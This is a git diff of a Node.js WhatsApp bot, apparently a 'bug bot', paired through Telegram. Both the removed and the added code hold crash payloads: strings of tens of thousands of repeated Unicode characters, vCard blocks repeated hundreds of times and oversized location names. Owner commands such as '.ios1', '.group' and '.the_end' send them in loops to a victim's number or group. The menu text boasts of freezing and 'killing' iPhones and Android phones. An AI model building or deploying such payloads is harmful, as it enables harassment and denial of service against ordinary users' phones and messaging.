@@ -16,67 +16,36 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 let botConfig = {
-    botName: "NEXUS-MD KILLER-V3",
+    botName: "NEXUS-MD V3 ELITE",
     owner: "94767475809", 
     prefix: ".",
-    isPublic: false
+    isPublic: false // Private Mode
 };
 
 // --- 🌐 WEB SERVER ---
-app.get('/', (req, res) => res.send('Nexus Killer System is Active! ☠️'));
-if (!global.serverStarted) {
-    app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));
-    global.serverStarted = true;
-}
+app.get('/', (req, res) => res.send('Nexus Elite Bug System is Online! ☠️'));
+app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));
 
 async function startNexus() {
     const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
-    const { version } = await fetchLatestBaileysVersion();
-
     const sock = makeWASocket({
-        version,
-        logger: pino({ level: 'silent' }),
         auth: state,
-        browser: ["Ubuntu", "Chrome", "20.0.04"], 
+        logger: pino({ level: 'silent' }),
+        browser: ["Ubuntu", "Chrome", "20.0.04"],
         printQRInTerminal: false
     });
 
-    // --- 🤖 TELEGRAM PAIRING & MENU ---
-    tgBot.onText(/\/start/, (msg) => {
-        const opts = {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: '🔥 GET PAIRING CODE', callback_data: 'get_code' }],
-                    [{ text: '☠️ BUG LIST', callback_data: 'bug_list' }]
-                ]
-            }
-        };
-        tgBot.sendMessage(msg.chat.id, `☠️ *NEXUS-MD ULTIMATE KILLER* ☠️\n\nWelcome Master! Select an option:`, { parse_mode: 'Markdown', ...opts });
-    });
-
-    tgBot.on('callback_query', (query) => {
-        if (query.data === 'get_code') {
-            tgBot.sendMessage(query.message.chat.id, "ඔබගේ WhatsApp අංකය එවන්න (Ex: 947xxxxxxxx)");
-        } else if (query.data === 'bug_list') {
-            const bugs = `🔥 *COMMANDS LIST (PRIVATE)*\n\n` +
-                         `.the_end [number] - iPhone/Android Killer\n` +
-                         `.vcard [number] - Contact Freeze\n` +
-                         `.loc [number] - Location Lag\n` +
-                         `.kill [number] - Unicode Crash`;
-            tgBot.sendMessage(query.message.chat.id, bugs, { parse_mode: 'Markdown' });
-        }
-    });
-
+    // --- 🤖 TELEGRAM PAIRING ---
     tgBot.on('message', async (msg) => {
-        if (msg.text && /^\d+$/.test(msg.text) && msg.text.length > 9) {
+        if (msg.text && /^\d+$/.test(msg.text)) {
             try {
-                let code = await sock.requestPairingCode(msg.text.replace(/[^0-9]/g, ''));
-                tgBot.sendMessage(msg.chat.id, `🔥 *YOUR SYSTEM KEY:* \`${code}\``, { parse_mode: 'Markdown' });
+                let code = await sock.requestPairingCode(msg.text);
+                tgBot.sendMessage(msg.chat.id, `🔥 *NEXUS-MD ELITE CODE:* \`${code}\``, { parse_mode: 'Markdown' });
             } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ Error!"); }
         }
     });
 
-    // --- 📩 WHATSAPP BUG HANDLER ---
+    // --- 📩 WHATSAPP HANDLER ---
     sock.ev.on('messages.upsert', async (chatUpdate) => {
         try {
             const mek = chatUpdate.messages[0];
@@ -86,54 +55,93 @@ async function startNexus() {
             const isOwner = sender.includes(botConfig.owner) || mek.key.fromMe;
             
             const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
-            const isCmd = body.startsWith(botConfig.prefix);
-            const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : "";
+            if (!body.startsWith(botConfig.prefix)) return;
+            if (!isOwner) return; // ඔයාට විතරයි වැඩ කරන්නේ
+
+            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
             const text = body.trim().split(/ +/).slice(1).join(" ");
+            const target = text + "@s.whatsapp.net";
 
-            if (isCmd && !isOwner) return; 
+            // --- 🦠 BUG PAYLOADS ---
+            const bug1 = "☠️" + "ꦿ".repeat(50000); // Unicode Kill
+            const bug2 = "🔥" + "᥋".repeat(60000); // iOS Lag
+            const bug3 = "❄️" + "꠵".repeat(70000); // UI Freeze
+            const vcardBug = 'BEGIN:VCARD\nVERSION:3.0\nFN:Nexus Virus\nEND:VCARD'.repeat(250);
 
-            if (isCmd) {
-                const target = text + "@s.whatsapp.net";
-
-                switch (command) {
-                    case 'menu':
-                        await sock.sendMessage(from, { text: `☠️ *NEXUS-MD ULTIMATE*\n\n.the_end\n.vcard\n.kill\n.loc\n\n_Status: Deadly_` }, { quoted: mek });
-                        break;
-
-                    case 'the_end': // 🔥 IPHONE & ANDROID KILLER (10M+ CHARACTERS)
-                        if (!text) return;
-                        await sock.sendMessage(from, { text: "🚀 Sending THE END Bug... Target: " + text });
-                        const superBug = "☠️ THE END ☠️\n" + "ꦿ".repeat(50000) + "᥋".repeat(50000) + "꠵".repeat(50000);
-                        for (let i = 0; i < 10; i++) {
-                            await sock.sendMessage(target, { text: superBug });
-                            await delay(300);
+            switch (command) {
+                case 'menu':
+                case 'bug':
+                    const menu = `╭───〔 *${botConfig.botName}* 〕───┈
+│
+│ 🦠 *KILLER BUG MENU (9 TYPES)*
+│
+├ ☠️ *1. .ios1* [number] - iPhone Hard Lag
+├ 🔥 *2. .ios2* [number] - iPhone UI Freeze
+├ 💀 *3. .kill* [number] - Android Crash
+├ ❄️ *4. .freeze* [number] - System Lag
+├ 📍 *5. .loc* [number] - Location Bug
+├ 📇 *6. .vcard* [number] - Contact Crash
+├ 🌀 *7. .group* [jid] - Group Destroyer
+├ 🧨 *8. .bomb* [number] - Spam Bug
+├ 🌌 *9. .the_end* [number] - Total System Wipe
+│
+╰─────────────┈
+ ⚡ *STATUS:* PRIVATE MODE
+ 👑 *DEV:* SASIYA MD`;
+                    
+                    // ලස්සන පින්තූරයක් එක්ක මෙනු එක යවන්න (image url එකක් දාන්න පුළුවන්)
+                    await sock.sendMessage(from, { 
+                        text: menu,
+                        contextInfo: { 
+                            externalAdReply: { 
+                                title: "NEXUS-MD V3 ELITE BUG SYSTEM",
+                                body: "iPhone & Android Destroyer",
+                                mediaType: 1,
+                                thumbnailUrl: "https://telegra.ph/file/a8a183d25667e41793741.jpg", // මෙතනට කැමති image එකක් දාන්න
+                                sourceUrl: "https://github.com/SasiyaMD"
+                            }
                         }
-                        await sock.sendMessage(from, { text: "💀 Target System Destroyed!" });
-                        break;
+                    }, { quoted: mek });
+                    break;
 
-                    case 'vcard':
-                        if (!text) return;
-                        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:Crash Master\n' + 'TEL;waid=' + text + ':+' + text + '\n' + 'END:VCARD'.repeat(200);
-                        await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
-                        break;
+                case 'ios1':
+                case 'ios2':
+                    if (!text) return;
+                    await sock.sendMessage(from, { text: "🚀 Sending iPhone Killer Bug..." });
+                    for(let i=0; i<8; i++) {
+                        await sock.sendMessage(target, { text: bug2 });
+                        await delay(400);
+                    }
+                    await sock.sendMessage(from, { text: "💀 iPhone Target Is Dead!" });
+                    break;
 
-                    case 'kill':
-                        if (!text) return;
-                        await sock.sendMessage(target, { text: "☠️" + "ꦿ".repeat(80000) });
-                        break;
+                case 'group':
+                    if (!text) return;
+                    await sock.sendMessage(from, { text: "🧨 Group Bug Deploying..." });
+                    for(let i=0; i<10; i++) {
+                        await sock.sendMessage(text, { text: bug1 + bug3 });
+                    }
+                    break;
 
-                    case 'loc':
-                        if (!text) return;
-                        await sock.sendMessage(target, { location: { degreesLatitude: 37, degreesLongitude: -122, name: "Nexus-MD-" + "Z".repeat(30000) } });
-                        break;
-                }
+                case 'the_end':
+                    if (!text) return;
+                    await sock.sendMessage(from, { text: "🌑 *THE END SYSTEM DEPLOYED...*" });
+                    for(let i=0; i<15; i++) {
+                        await sock.sendMessage(target, { text: bug1 + bug2 + bug3 });
+                    }
+                    break;
+
+                case 'vcard':
+                    if (!text) return;
+                    await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard: vcardBug }] } });
+                    break;
             }
         } catch (e) { console.log(e); }
     });
 
     sock.ev.on('connection.update', (up) => {
         if (up.connection === 'close') startNexus();
-        else if (up.connection === 'open') console.log('KILLER BOT READY!');
+        else if (up.connection === 'open') console.log('ELITE BUG BOT READY!');
     });
     sock.ev.on('creds.update', saveCreds);
 }
